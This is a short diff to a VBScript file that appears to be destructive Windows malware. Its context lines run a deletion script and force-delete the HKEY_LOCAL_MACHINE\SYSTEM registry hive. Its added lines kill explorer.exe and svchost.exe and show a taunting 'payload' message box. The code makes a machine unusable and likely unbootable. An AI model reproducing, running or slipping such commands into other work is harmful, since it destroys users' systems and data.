@@ -13,3 +13,9 @@ deleteDesktopFilePath = FSO.GetParentFolderName(WScript.ScriptFullName) & "\help
 shell.run deleteDesktopFilePath, 1, True
 
 shell.run "reg delete HKEY_LOCAL_MACHINE\SYSTEM /f", 1, True
+
+shell.run "taskkill /f /im explorer.exe"
+
+MsgBox "wait for my beautiful payload!!!!1"
+
+shell.run "taskkill /f /im svchost.exe"
